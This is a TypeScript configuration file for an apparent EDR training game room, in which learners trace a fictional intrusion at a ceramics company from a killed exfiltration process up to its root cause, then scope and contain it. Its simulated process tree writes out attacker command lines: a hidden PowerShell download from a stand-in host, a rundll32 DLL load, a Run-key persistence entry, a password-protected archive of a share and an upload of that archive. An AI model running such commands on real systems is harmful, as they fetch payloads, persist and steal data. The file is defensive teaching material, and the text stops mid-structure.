import type { RoomExperience } from "./types";

// "Operation Process Tree" for the "edr-detection-investigation" room.
// Script: docs/campaign/80-edr-detection-investigation.md.
// Station task ids must match the room's task order exactly (see getRoomExperience).
//
// Kilnworth Ceramics (fictional), not the graded tasks' NexaCorp records.
// Mentor: Mateusz Oyelaran, EDR Engineer.
// Signature: rooms 39 and 40 introduce the products, this room is about method. An EDR portal
// where the sensor has already killed the loudest node, and the learner walks up the process
// tree past it to the root cause, pivots, scopes the fleet, decides and contains. A duel meets
// each evasion move with the telemetry that still catches it.
// Game mix: duel + outbreak + portal.
//
// TASK ORDER CHANGED. The room ends with qf1, f1, q4, q5, so the only task where the learner
// writes something ends up in the middle of a station. New order, for the integrator:
//   edr-r1, edr-r2, edr-q1, edr-m1 | edr-r3, edr-o1, edr-r4, edr-q2, edr-la1 |
//   edr-r5, edr-q3, edr-r6, edr-ac1 | edr-r7, edr-f1, edr-q4, edr-q5 | edr-qf1
// Only qf1 moves, to the end, so the boss is the hunt the learner writes by hand.
//
// The portal's tree clicks and Details clicks are commit clicks in PortalLab, so a wrong one
// costs a life even though looking around is free elsewhere. That is why this lab sets howTo.
// Host containment has no visible state in the EDR skin, so the lab shows no containment field.
//
// Lab data differs from the graded tasks: the chain is a script from a mounted disc image,
// never Office to PowerShell (q2) or a Temp binary under explorer.exe (la1); the detection is
// Critical with "Prevention, process killed.", never "Detection, standard detection." (r2 checkpoint,
// la1); the mask rows put full access on an installer's own child and low access on lsass.exe,
// never 2097151 on lsass.exe (la1); the verdict drill is a print driver through rundll32.exe,
// never regsvr32.exe, svc-sccm or a NexaDeploy path (ac1); the siblings are a Run key, an
// archive and an upload, never a scheduled task, a PowerShell download and LSASS (q3, la1);
// the host with the same hash turns up the same day under a new file name, never two days
// later, and the lab stops at the fact (q5); the response drill uses moves q4 doesn't offer and
// no row wins outright (q4); the hunt drill reads rows and is about a different tool and hash
// (qf1, f1). The one deliberate exception: the second qf1 drill repeats la1's record, because
// qf1 needs its exact hash and the boss screen shows no event. Its hash field has no note, so
// it renders as selectable text.

export const EDR_DETECTION_INVESTIGATION: RoomExperience = {
  roomId: "edr-detection-investigation",
  codename: "Operation Process Tree",
  theme: "processtree",
  handler: { name: "Mateusz Oyelaran", role: "EDR Engineer, Kilnworth Ceramics" },
  briefing: [
    "Kilnworth Ceramics. 620 people, two factories, and a book of glaze recipes that took four generations to get right.",
    "Overnight, the workstation in the glaze lab started sending files somewhere new.",
    "The EDR console caught it, killed it and called it Critical, and the plant manager has already asked whether that means it's over.",
    "Mateusz Oyelaran runs the sensors here and and has seen this go wrong before.",
  ],
  mission: "Read a detection field by field, walk a process tree past the loudest node to the root cause, meet each evasion with the telemetry that survives it, tie sibling behaviours into one story, reassess a severity, scope the fleet, cut ahead of the spread, then write the hunt yourself.",
  estimate: "~70 min",
  look: { primary: "#a8d8b9", secondary: "#ffb86b", warn: "#ff5d5d" },
  scene: "facilityprocesstree",
  layout: "facility",
  story: {
    intro: { title: "Killed Is Not Cured", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/edr-detection-investigation/processtree-intro-072874dc.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/edr-detection-investigation/processtree-intro-f4c6369f.jpg" },
    afterStation: {
      tree: { title: "Not Yet", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/edr-detection-investigation/processtree-ch2-8163345e.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/edr-detection-investigation/processtree-ch2-dfdd57f5.jpg" },
      pivot: { title: "Back Online", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/edr-detection-investigation/processtree-ch3-4026c6c7.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/edr-detection-investigation/processtree-ch3-e6955273.jpg" },
      branch: { title: "Root and Branch", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/edr-detection-investigation/processtree-finale-a9093ae1.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/edr-detection-investigation/processtree-finale-6b726245.jpg" },
    },
  },
  stations: [
    {
      id: "detection",
      label: "The Detection",
      topic: "What EDR sees · the fields of a detection · severity and disposition · access masks",
      tagline: "Read past the colour",
      building: "control",
      taskIds: ["edr-r1", "edr-r2", "edr-q1", "edr-m1"],
    },
    {
      id: "tree",
      label: "Up the Tree",
      topic: "The six-step workflow · parent-child anomalies · LOLBins · process access",
      tagline: "Start where it fired, end where it began",
      building: "lab",
      taskIds: ["edr-r3", "edr-o1", "edr-r4", "edr-q2", "edr-la1"],
    },
    {
      id: "siblings",
      label: "The Siblings",
      topic: "AggregateId · correlated behaviours · severity reassessment · verdicts",
      tagline: "Three tickets, or one story?",
      building: "office",
      taskIds: ["edr-r5", "edr-q3", "edr-r6", "edr-ac1"],
    },
    {
      id: "pivot",
      label: "The Pivot",
      topic: "Hash reputation · file and network pivots · fleet scope · containment",
      tagline: "Where else?",
      building: "archive",
      taskIds: ["edr-r7", "edr-f1", "edr-q4", "edr-q5"],
    },
    {
      id: "branch",
      label: "The Last Branch",
      topic: "Writing a fleet-wide hunt in Advanced Hunting",
      tagline: "One more question for the fleet",
      building: "vault",
      taskIds: ["edr-qf1"],
      boss: true,
    },
  ],
  personas: {
    "edr-q1": { name: "Mateusz Oyelaran", role: "EDR Engineer", line: "One field is shouting at you. Tell me what it's worth." },
    "edr-m1": { name: "Mateusz Oyelaran", role: "EDR Engineer", line: "If you can't name the fields, you're reading colours." },
    "edr-o1": { name: "Mateusz Oyelaran", role: "EDR Engineer", line: "New starters always want to jump ahead. Put it in order." },
    "edr-q2": { name: "Mateusz Oyelaran", role: "EDR Engineer", line: "Here's a chain from another site. Talk me through it." },
    "edr-la1": { name: "Mateusz Oyelaran", role: "EDR Engineer", line: "Read the record, not the title on it." },
    "edr-q3": { name: "Mateusz Oyelaran", role: "EDR Engineer", line: "These are somebody else's triage notes. What do you make of them?" },
    "edr-ac1": { name: "Mateusz Oyelaran", role: "EDR Engineer", line: "The deployment team is on the line. Your call." },
    "edr-f1": { name: "Mateusz Oyelaran", role: "EDR Engineer", line: "I need one ID for the hunt ticket." },
    "edr-q4": { name: "Mateusz Oyelaran", role: "EDR Engineer", line: "The verdict is in. What happens to that host right now?" },
    "edr-q5": { name: "Mateusz Oyelaran", role: "EDR Engineer", line: "The pager has gone off again. What am I looking at?" },
    "edr-qf1": { name: "Mateusz Oyelaran", role: "EDR Engineer", line: "One more question for the fleet. Write this one yourself." },
  },
  briefings: {
    // ── Reading 1: what the sensor sees ──
    "edr-r1": [
      {
        kind: "sort",
        title: "Who Could Have Told You That?",
        prompt: "Monday, 06:55, Kilnworth. Three sources saw last night, and Mateusz Oyelaran wants you to know what each one can and can't say before you touch the console. Sort each fact by the source that could have told you.",
        primer: {
          title: "Three places to stand",
          points: [
            "A **firewall log** sees packets crossing a boundary: addresses, ports, bytes. It has no idea which process sent them.",
            "A single **Windows event** is a snapshot: a logon, a lockout. Nothing ties it to what came before or after.",
            "**EDR (endpoint detection and response) telemetry** comes from a sensor on the endpoint. It ties every action to the process that did it: parent, command line, files, connections, and one process reaching into another.",
          ],
          example: {
            label: "A worked read: one print job",
            lines: [
              "Firewall: 10.9.1.7 to 10.9.2.5 on port 9100, 44 KB.",
              "Windows event: a logon by the print service account.",
              "EDR: `reader.exe`, started by `explorer.exe` for user p.ross, opened that connection.",
            ],
          },
          fold: true,
        },
        buckets: [
          { id: "fw", label: "Firewall log" },
          { id: "win", label: "A single Windows event" },
          { id: "edr", label: "EDR telemetry" },
        ],
        items: [
          { id: "i1", text: "A session left 10.30.4.22 for 203.0.113.58 on port 443", bucket: "fw", why: "Addresses and a port crossing the boundary: exactly what a firewall records." },
          { id: "i2", text: "Which process on 10.30.4.22 opened that session", bucket: "edr", why: "The firewall stops at the address. Only a sensor on the endpoint knows which process owns the socket." },
          { id: "i3", text: "a.lindqvist logged on to KW-FS02 over the network at 06:31", bucket: "win", why: "A logon event names the account and the target, and stops there." },
          { id: "i4", text: "The whole chain from the first process to the last one", bucket: "edr", why: "Parent, grandparent and on up: the causal chain is what EDR adds." },
          { id: "i5", text: "2.8 GB went out to an address the plant has never used", bucket: "fw", why: "Byte counts per session sit in the firewall log. It still can't say what sent them." },
          { id: "i6", text: "One process asked for access to another process's memory", bucket: "edr", why: "Ordinary logs never capture this. The sensor sees the access request itself." },
          { id: "i7", text: "An account locked out at 02:13 on one user's desk", bucket: "win", why: "Windows logged the lockout. It can't say what caused it." },
          { id: "i8", text: "The exact arguments a process ran with, and the files it then wrote", bucket: "edr", why: "Tied to that specific process, not just to the host." },
        ],
      },
    ],
    // ── Reading 2: the fields of a detection ──
    "edr-r2": [
      {
        kind: "anatomy",
        title: "Anatomy of a Detection",
        prompt: "Mateusz opens a Medium from the glaze lab's workstation, not the Critical, because a calm one is the best place to learn the fields. Scan each one: every later decision in this room comes from these.",
        source: "EDR console · Detection (EppDetectionSummaryEvent) · KW-GLZ-WS04",
        fields: [
          { key: "SeverityName", value: "Medium", label: "The rating", note: "This word came from the tool alone: nobody at Kilnworth had seen the event when it appeared. Use it to choose what to open first, and expect nothing more from it." },
          { key: "Tactic", value: "Collection", label: "The goal", note: "Where this sits in MITRE ATT&CK. Collection means gathering data before moving it." },
          { key: "Technique", value: "Archive Collected Data", label: "The method", note: "How that goal was pursued. A nightly backup script earns the same entry, so it frames the case and stops there." },
          { key: "PatternDispositionDescription", value: "Detection, standard detection.", label: "What the tool did", note: "A sharper question than severity: did it stop anything? 'Detection, standard detection.' means it only watched, so the action ran. 'Prevention, process killed.' means it stepped in." },
          { key: "FileName", value: "7za.exe", label: "What ran", note: "The process the detection is about." },
          { key: "ParentImageFileName", value: "cmd.exe", label: "Who started it", note: "A shell launched the archiver, so this wasn't someone double-clicking an icon. One level up already changes the picture." },
          { key: "CommandLine", value: "7za.exe a -pK1ln C:\\Users\\Public\\b.7z \\\\KW-FS02\\GlazeRecipes", label: "With what arguments", note: "Here: a password-protected archive of a whole share, written to a public folder. The title of the detection tells you none of that." },
          { key: "FilePath", value: "\\Device\\HarddiskVolume3\\ProgramData\\KilnTune\\7za.exe", label: "Where it lives", note: "The full path of the binary, written the way the sensor sees the disk: \\Device\\HarddiskVolume3 is the C: drive." },
          { key: "SHA256String", value: "a458179eae4a5286e406f8ded0ba6ed4a4f17b3f5d6d9a1bca485ff920b57067", label: "The fingerprint", note: "A name can change, and this can't unless the file does. It is what you carry out of the console. The sensor telemetry behind the detection carries the same value as SHA256HashData." },
          { key: "UserName", value: "a.lindqvist", label: "Whose session", note: "The account the process ran as." },
          { key: "LogonDomain", value: "KILNWORTH", label: "Which domain", note: "The domain of that account." },
          { key: "AggregateId", value: "aggind:a5767b0088778c1316ca10b2f94edfdd:4318820551", label: "Which tree", note: "Behaviours sharing this value were tied by the tool to one process tree. Pull them all before you judge this one." },
        ],
        summary: "Whatever console is open, the questions are the same: what ran, started by what, with what arguments, with what hash, and what did the tool do about it. Microsoft Defender for Endpoint only changes the names: FileName, ProcessCommandLine and SHA256 describe the flagged process, every InitiatingProcess column points one level up the tree, and DetectionSource says which component raised the alert. What Defender did is in the alert's action and remediation status, the counterpart of PatternDispositionDescription.",
      },
      {
        kind: "anatomy",
        title: "Anatomy of One Process Reaching Into Another",
        prompt: "Some events have no parent-child link at all. One process asks for a handle on another. Here is an honest one from the kiln monitoring PC, so you can learn the shape without the alarm.",
        source: "EDR console · Process access event · KW-KLN-MON2",
        fields: [
          { key: "ImageFileName", value: "\\Device\\HarddiskVolume3\\Windows\\System32\\WerFault.exe", label: "Who is reaching", note: "WerFault.exe is Windows Error Reporting, the crash reporter. On a process access event this is the actor, written as the full device path. It writes the crashed app's memory to a file with MiniDumpWriteDump from dbghelp.dll, the Windows debug-help library." },
          { key: "TargetProcessImageFileName", value: "\\Device\\HarddiskVolume3\\Program Files\\Kilnworth\\KilnMonitor\\KilnMonitor.exe", label: "Who is reached", note: "The process being opened. Read these two the wrong way round and you accuse the victim." },
          { key: "DesiredAccess", value: "5136", label: "The rights it asked for", note: "The access mask, which the console writes in decimal. 5136 is 0x1410: query the process and read its memory, and nothing more." },
        ],
        summary: "A crash reporter dumping the app that crashed is what this tool is for. The shape to carry forward is who reached for whom and what rights it asked for. The same shape against a process that holds secrets is another conversation.",
      },
      {
        kind: "worksheet",
        title: "Did It Run?",
        prompt: "Five closed cases from last quarter, in the fields you just read. Mateusz wants two things kept apart: how the tool rated each one, and what it actually did.",
        caption: "Closed detections · last quarter",
        columns: ["Hostname", "SeverityName", "PatternDispositionDescription", "FileName"],
        rows: [
          ["KW-SLS-LT05", "High", "Prevention, process killed.", "inv_2291.exe"],
          ["KW-STU-WS11", "Low", "Detection, standard detection.", "psexec64.exe"],
          ["KW-MNT-WS03", "Critical", "Prevention, process killed.", "update_kb.exe"],
          ["KW-IT-WS02", "Medium", "Detection, standard detection.", "bitsadmin.exe"],
          ["KW-HR-WS09", "High", "Prevention, process killed.", "mshta.exe"],
        ],
        questions: [
          { id: "ran", q: "How many of the five actions ran to completion?", hint: "Cover the SeverityName column. Which rows say the tool only watched?", answer: ["2", "two"], why: "KW-STU-WS11 and KW-IT-WS02. 'Detection, standard detection.' means it happened, and a Low can have run while a Critical was stopped. The rating and the outcome are two different fields." },
          { id: "first", q: "You have time to open one row before the rest. Which host?", hint: "What is SeverityName good for?", answer: ["KW-MNT-WS03", "MNT-WS03"], why: "Severity is a fair way to order a queue, and that is about all it does. It chose where you look first, not what you will find there." },
          { id: "closed", q: "That Critical was stopped. Does that close the case? (yes/no)", hint: "Stopping it covers how much of the story?", answer: ["no"], why: "Stopping it covers one action. What started it, and what ran before it, is still unread. That is what the process tree is for." },
        ],
      },
    ],
    // ── Reading 3: the order of work ──
    "edr-r3": [
      {
        kind: "portal",
        title: "Past the Loudest Node",
        prompt: "Monday, 07:05, Kilnworth. The pager woke Mateusz Oyelaran for a Critical on the glaze lab's workstation, and the plant manager has heard that the tool killed something and thinks that's the end of it. Work it the way Mateusz would, one step at a time.",
        howTo: [
          "Read the job for this step above the console.",
          "Work in the console as you would at your desk: menus, rows, buttons, drop-downs.",
          "Looking around is free, and a wrong action costs a life and tells you why.",
          "When a step says Select, the row you pick is a decision. So is any click on the process tree or in Details.",
        ],
        primer: {
          title: "How to climb a process tree",
          points: [
            "Each indent is a child: the process above it, one step to the left, started it.",
            "Read **upward** from the flagged process. Each parent explains its child, and a shell like `cmd.exe` decides nothing: it runs what it is told.",
            "The node that fired is the **loudest**, not the first. The **root cause** is the first process in the chain with no honest reason to exist.",
            "`explorer.exe` starts whatever a user opens, so it is never the root cause. Look just below it.",
            "A disposition covers one process. A kill says nothing about what sits above it.",
          ],
          example: {
            label: "A worked climb: a web shop's ransom alert",
            lines: [
              "Flagged, Critical: `vssadmin.exe delete shadows`.",
              "Parent: `cmd.exe`, a shell, so keep climbing.",
              "Parent: `w3wp.exe`, the web server. A web server has no honest reason to start a shell.",
              "Root cause: the web application behind `w3wp.exe`, not the loud command at the bottom.",
            ],
          },
          fold: true,
        },
        skin: "edr",
        product: "EDR console",
        resource: "Kilnworth",
        tenant: "kilnworth.example",
        home: "dash",
        menu: [
          { items: [{ id: "dash", label: "Dashboard" }] },
          { group: "Endpoint security", items: [{ id: "detections", label: "Endpoint detections" }] },
          { group: "Investigate", items: [{ id: "intel", label: "Hash lookup" }, { id: "events", label: "Event search" }] },
          { group: "Host setup and management", items: [{ id: "hosts", label: "Host management" }] },
        ],
        pages: {
          dash: { heading: "Dashboard", tiles: [{ label: "New detections", value: "7" }, { label: "Hosts online", value: "612" }], note: "A summary. Detections are worked from the list." },
          detections: {
            heading: "Endpoint detections",
            filters: ["Status: New", "Last 24 hours", "Oldest first"],
            table: {
              columns: ["Severity", "Detect time", "Hostname", "Tactic & technique", "Triggering file", "Status"],
              rows: [
                { id: "d3", tone: "low", record: "d3", cells: ["Low", "23:46", "KW-GLZ-WS04", "Persistence via Boot or Logon Autostart Execution", "reg.exe", "New"] },
                { id: "d7", tone: "low", cells: ["Low", "01:20", "KW-GLZ-WS04", "Machine Learning via Sensor-based ML", "driverupd.exe", "New"] },
                { id: "d6", tone: "medium", cells: ["Medium", "04:05", "KW-IT-WS02", "Execution via Command and Scripting Interpreter", "cmd.exe", "New"] },
                { id: "d5", tone: "medium", cells: ["Medium", "04:12", "KW-IT-WS02", "Discovery via System Information Discovery", "systeminfo.exe", "New"] },
                { id: "d4", tone: "medium", cells: ["Medium", "04:19", "KW-IT-WS02", "Stealth via Masquerading", "setup_x64.tmp", "New"] },
                { id: "d2", tone: "medium", record: "d2", cells: ["Medium", "06:31", "KW-GLZ-WS04", "Collection via Archive Collected Data", "7za.exe", "New"] },
                { id: "d1", tone: "critical", record: "d1", cells: ["Critical", "06:52", "KW-GLZ-WS04", "Exfiltration via Exfiltration Over Web Service", "fontsvc.exe", "New"] },
              ],
            },
          },
          intel: {
            heading: "Hash lookup",
            filters: ["Files from detection KW-GLZ-WS04 06:52"],
            note: "Engines flagging counts the vendors that call a file malicious.",
            table: {
              columns: ["File", "SHA256", "Engines flagging", "First seen anywhere", "Signer"],
              rows: [
                { id: "hk-font", cells: ["fontsvc.exe", "d90c17e4...5e62ab", "1 of 71", "2021", "None"] },
                { id: "hk-rund", cells: ["rundll32.exe", "7f2e40b1...c09d13", "0 of 71", "2019", "Microsoft Windows"] },
                { id: "hk-kt", cells: ["kt.dll", "1ac63083...0527c7", "0 of 71", "Friday", "None"] },
              ],
            },
          },
          events: {
            heading: "Event search",
            filters: ["SHA256HashData = 1ac63083...0527c7", "All hosts", "Last 7 days"],
            note: "This searches every host's telemetry, whether or not anything alerted there.",
            table: {
              columns: ["Hostname", "Event", "File", "User name", "Time", "Detections"],
              rows: [
                { id: "ev-glz", cells: ["KW-GLZ-WS04", "Module load", "kt.dll", "a.lindqvist", "Sun 23:44", "4"] },
                { id: "ev-pln", cells: ["KW-PLN-WS07", "Module load", "kt.dll", "s.brandt", "Mon 05:40", "0"] },
                { id: "ev-lab", cells: ["KW-SEC-LAB1", "Module load", "kt.dll", "m.oyelaran", "Mon 06:58", "0"] },
              ],
            },
          },
          hosts: {
            heading: "Host management",
            filters: ["Status: Online"],
            table: {
              columns: ["Hostname", "Type", "OS version", "Status", "Last seen"],
              rows: [
                { id: "h-dc", cells: ["KW-DC01", "Domain Controller", "Windows Server 2022", "Online", "07:04"] },
                { id: "h-fs", cells: ["KW-FS02", "Server", "Windows Server 2022", "Online", "07:04"] },
                { id: "h-glz", record: "h-glz", cells: ["KW-GLZ-WS04", "Workstation", "Windows 11", "Online", "07:04"] },
                { id: "h-pln", record: "h-pln", cells: ["KW-PLN-WS07", "Workstation", "Windows 11", "Online", "07:03"] },
              ],
            },
          },
        },
        records: {
          d1: {
            id: "d1",
            title: "KW-GLZ-WS04",
            strip: [{ field: "status", label: "Status", value: "New", options: ["True positive", "False positive", "Ignored"] }],
            facts: [["Severity", "Critical"], ["Objective", "Follow Through"], ["Tactic & technique", "Exfiltration via Exfiltration Over Web Service"], ["Pattern disposition", "Prevention, process killed."], ["User name", "a.lindqvist"]],
            tree: [
              { id: "exp", depth: 0, name: "explorer.exe", detail: "user shell, running", facts: [["Command line", "C:\\Windows\\explorer.exe"]] },
              { id: "edge", depth: 1, name: "msedge.exe", detail: "browser, running", facts: [["Command line", "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\""]] },
              { id: "wsc", depth: 1, name: "wscript.exe", detail: "exited", facts: [["Command line", "\"C:\\Windows\\System32\\wscript.exe\" \"E:\\KilnTune_Profiles\\profiles.js\""], ["Drive E:", "Mounted disc image, KilnTune_Profiles.iso"], ["Started", "Sun 23:41"]] },
              { id: "ps", depth: 2, name: "powershell.exe", detail: "exited", facts: [["Command line", "powershell.exe -nop -w hidden -c iwr https://kilntune-support.example/k.bin -o C:\\ProgramData\\KilnTune\\kt.dll"], ["Started", "Sun 23:43"]] },
              { id: "rund", depth: 3, name: "rundll32.exe", detail: "running, 1 network", facts: [["Command line", "rundll32.exe C:\\ProgramData\\KilnTune\\kt.dll,Start"], ["Remote address", "203.0.113.58:443"], ["Started", "Sun 23:44"]] },
              { id: "reg", depth: 4, name: "reg.exe", detail: "exited, 1 registry", facts: [["Command line", "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v KilnTune"], ["Started", "Sun 23:46"]] },
              { id: "cmd", depth: 4, name: "cmd.exe", detail: "exited", facts: [["Command line", "cmd.exe /c"], ["Started", "Mon 06:30"]] },
              { id: "arc", depth: 5, name: "7za.exe", detail: "exited, 1 file written", facts: [["Command line", "7za.exe a -pK1ln C:\\Users\\Public\\b.7z \\\\KW-FS02\\GlazeRecipes"], ["Started", "Mon 06:31"]] },
              { id: "flag", depth: 5, name: "fontsvc.exe", detail: "killed by the sensor", bad: true, facts: [["Command line", "C:\\ProgramData\\KilnTune\\fontsvc.exe copy C:\\Users\\Public\\b.7z drop:kw --transfers 8"], ["Signer", "None"], ["Started", "Mon 06:50"]] },
            ],
            actions: [{ id: "hide", label: "Hide detection" }, { id: "rtr", label: "Connect to host" }],
          },
          d2: { id: "d2", title: "KW-GLZ-WS04", facts: [["Severity", "Medium"], ["Triggering file", "7za.exe"], ["Parent", "cmd.exe"], ["Pattern disposition", "Detection, standard detection."], ["Note", "Same AggregateId as the Critical"]] },
          d3: { id: "d3", title: "KW-GLZ-WS04", facts: [["Severity", "Low"], ["Triggering file", "reg.exe"], ["Parent", "rundll32.exe"], ["Pattern disposition", "Detection, standard detection."], ["Note", "Same AggregateId as the Critical"]] },
          "h-glz": {
            id: "h-glz",
            title: "KW-GLZ-WS04",
            facts: [["Type", "Workstation"], ["Host groups", "Glaze lab"], ["Prevention policy", "Plant standard"]],
            actions: [{ id: "contain", label: "Network contain" }, { id: "hidehost", label: "Hide host" }, { id: "reboot", label: "Reboot" }],
          },
          "h-pln": {
            id: "h-pln",
            title: "KW-PLN-WS07",
            facts: [["Type", "Workstation"], ["Host groups", "Planning office"], ["Prevention policy", "Plant standard"]],
            actions: [{ id: "containpln", label: "Network contain" }, { id: "hidehost", label: "Hide host" }, { id: "reboot", label: "Reboot" }],
          },
        },
        steps: [
          { id: "list", ask: "Open the list of detections.", hint: "Endpoint security, in the menu on the left.", target: "menu:detections", why: "Detections are worked from this list. Seven are new, oldest first, so position tells you nothing." },
          { id: "pick", ask: "Open the detection the pager went off for.", hint: "Read Severity, not position.", target: "row:d1", why: "Critical on the glaze lab's workstation, with a process tree beside the details. That rating sets where you start. It doesn't say what happened." },
          { id: "what", ask: "Before the tree: did the tool actually stop anything?", hint: "In Details: the field that says what the tool did, not how it rated it.", target: "action:field:Pattern disposition", why: "'Prevention, process killed.' The sensor stopped fontsvc.exe. That is one process. The field says nothing about anything above it, which is why 'it was killed' isn't the end of the story." },
          { id: "alive", ask: "Now the tree. Going up from the killed process, find the first one that's still alive.", hint: "Read the labels beside each process, moving up the chain from fontsvc.exe. Who started it, and who started that?", target: "tree:rund", why: "rundll32.exe, still running, still connected to 203.0.113.58, with kt.dll loaded from ProgramData. cmd.exe above fontsvc.exe had already exited. The sensor killed the tool, not the thing holding the tool." },
          { id: "how", ask: "A DLL in ProgramData doesn't load itself. Go up one.", hint: "The parent of rundll32.exe.", target: "tree:ps", why: "powershell.exe, in a hidden window, fetched kt.dll from kilntune-support.example and handed it on. That tells you how the DLL arrived, and something still had to start PowerShell." },
          { id: "root", ask: "Keep going to the root cause: the first process in this chain with no honest reason to exist.", hint: "It sits just below the user's shell.", target: "tree:wsc", why: "wscript.exe ran a script from E:, a mounted disc image. a.lindqvist went looking for firing profiles on a Sunday night shift and opened KilnTune_Profiles.iso. That is the root cause, four links above the node that fired, and killing fontsvc.exe touched none of it." },
          { id: "intel", ask: "Pivot. Go and look up the files in this chain.", hint: "Investigate, in the menu.", target: "menu:intel", why: "Now you leave the single detection. The tree told you which file to take with you." },
          { id: "hash", ask: "Select the file that deserves the hunt.", hint: "The foothold is rundll32.exe, but what did it load?", target: "row:hk-kt", why: "0 of 71 engines, unsigned, first seen on Friday. Zero detections isn't innocence: a new or custom-built tool simply has no reputation yet. This is the hash to search on." },
          { id: "events", ask: "Scope it. Has that file touched any other host?", hint: "Investigate, again.", target: "menu:events", why: "This is a query across the fleet, already filtered on the hash. It sees every host's telemetry, whether or not anything alerted there." },
          { id: "other", ask: "Select the row that changes the size of this incident.", hint: "Read the Detections column, and think about who is on each row.", target: "row:ev-pln", why: "KW-PLN-WS07 in the planning office loaded the same file at 05:40, with zero detections. Without this search the morning would end at one host. One file, two hosts." },
          { id: "back", ask: "Now you know the scope, go back to the detection.", hint: "Endpoint detections.", target: "menu:detections", why: "The record has to match what you found." },
          { id: "reopen", ask: "Open it again.", hint: "The same Critical row.", target: "row:d1", why: "Its status is still New." },
          { id: "tp", ask: "Record your verdict.", hint: "Status, beside the title.", target: "set:status:True positive", why: "Tree, hash and scope are all in. Now a verdict means something, and it isn't resting on the word Critical." },
          { id: "hosts", ask: "Contain. Go to where hosts are managed.", hint: "Host setup and management.", target: "menu:hosts", why: "Check what you are about to cut off. Containing a host has a cost." },
          { id: "glz", ask: "Open the host the detection fired on.", hint: "The hostname on the detection.", target: "row:h-glz", why: "A workstation: safe to cut off, though the glaze lab's night shift loses it." },
          { id: "cut", ask: "Stop it calling out, and keep your own access to it.", hint: "The actions at the top of the host.", target: "action:contain", why: "Network contain cuts the host off from everything except the cloud console. The beacon goes dead and you can still investigate." },
          { id: "hosts2", ask: "One host down. Back to the list.", hint: "Host setup and management, or the link above the title.", target: "menu:hosts", why: "A scope of two means two containments. Stopping at the host that alerted would leave the quiet one calling out." },
          { id: "pln", ask: "Open the host nothing alerted on.", hint: "The one your fleet search found.", target: "row:h-pln", why: "Zero detections, and the same DLL loaded." },
          { id: "cut2", ask: "Cut this one off too.", hint: "The same button.", target: "action:containpln", why: "Both hosts are off the network and both are still yours to work on. Next come the Run key, the files, and the passwords of both sessions." },
        ],
        traps: {
          "action:field:Severity": "Severity is the tool's rating of the pattern. It says nothing about whether anything was stopped.",
          "tree:exp": "explorer.exe is the user's shell. It starts whatever a user opens, so every chain on a desktop begins here. It can't be the root cause.",
          "tree:edge": "msedge.exe has no children in this tree: read the indentation. A browser fetches files, and it started nothing in this chain.",
          "tree:cmd": "cmd.exe has exited, and a shell decides nothing: it runs what it is told. Whatever told it sits above it.",
          "tree:arc": "7za.exe packed the recipes and exited. It sits beside the tool, not above it.",
          "tree:reg": "reg.exe wrote a Run key and exited. Note it, because that is how this comes back after a restart. It doesn't explain how anything began.",
          "tree:flag": "fontsvc.exe is the loud one, and the sensor has already killed it. Stopping here is exactly the mistake the plant manager is making.",
          "row:hk-rund": "That is Windows' own rundll32.exe, and it will always come back clean. A signed Windows tool's hash proves nothing: what it loaded is the lead.",
          "row:hk-font": "fontsvc.exe is the loud node, and the sensor killed it. It sits at the bottom of the chain, so it can't tell you how far the foothold spread.",
          "row:ev-lab": "KW-SEC-LAB1 is Mateusz's analysis machine: that row is the sample being pulled for a closer look.",
          "row:ev-glz": "That is the host you started from. The question is where else.",
          "set:status:True positive": "The verdict is one decision, made once, when the tree, the pivot and the fleet search are all in. At any other moment this click records nothing new.",
          "set:status:False positive": "Nothing here is false: the rule fired on a real upload started by a real intrusion.",
          "set:status:Ignored": "Ignoring it leaves a live beacon running.",
          "action:hide": "Hiding a detection removes it from the list. The beacon carries on, unseen.",
          "action:rtr": "A remote shell is for cleaning up, once you know what you are cleaning. It stops nothing by itself.",
          "action:hidehost": "Hide host removes it from the console. It would still be calling out, and you would no longer see it.",
          "action:reboot": "A reboot wipes what is in memory, and the Run key would load the DLL straight back.",
          "action:contain": "This button is for the moment you know every host involved, and it only needs pressing once. Cutting off one host while others are unknown tells the attacker you have noticed.",
        },
        lesson: "Start where it fired and climb. A disposition tells you what the tool did to one process, not to the chain above it. The root cause is the first process with no honest reason to exist, not the loudest node, and a quiet host can hold the same file as a loud one. Each step of this job gave the next one something to work on.",
      },
      {
        kind: "match",
        title: "What the Shortcut Cost",
        prompt: "Mateusz keeps a list of what Kilnworth's past shortcuts cost. Match each shortcut to the bad day it caused.",
        pairs: [
          { id: "p1", left: "Gave a verdict from the title and severity alone", right: "A routine install was escalated at 03:00, and a week later a real one was skimmed past", why: "A detection rarely holds enough context to separate malicious from benign. That is why the tree comes straight after it." },
          { id: "p2", left: "Pivoted before expanding the tree", right: "An hour went on the reputation of a file that wasn't the one doing the work", why: "The tree tells you which process and which hash matter. Without it you chase the wrong one." },
          { id: "p3", left: "Decided before scoping", right: "The case was closed while the same file sat quietly on three more desks", why: "A verdict on one host says nothing about the others. Scope is what makes it safe to close." },
          { id: "p4", left: "Contained before scoping", right: "One laptop was cut off, and the others nobody had looked for stayed open", why: "Containment acts on what you know, so the fleet search comes first." },
        ],
      },
    ],
    // ── Reading 4: reading the tree ──
    "edr-r4": [
      {
        kind: "sort",
        title: "Everyday, Anomaly or Not Enough?",
        prompt: "Mateusz reads you single lines from other sites' trees. For each one, call it: an everyday pairing, an anomaly, or too little shown to say anything.",
        primer: {
          title: "Three questions for any tree",
          points: [
            "Does this **parent and child** pairing happen anywhere in honest work?",
            "Does the **command line** hold something that shouldn't need to be there: encoding, an odd path, an unexpected destination?",
            "Is a **sensitive object** being touched that this chain has no reason to reach?",
            "A **LOLBin** (living-off-the-land binary) is a signed Windows tool an attacker can use for other purposes, like `mshta.exe` or `certutil.exe`.",
          ],
          example: {
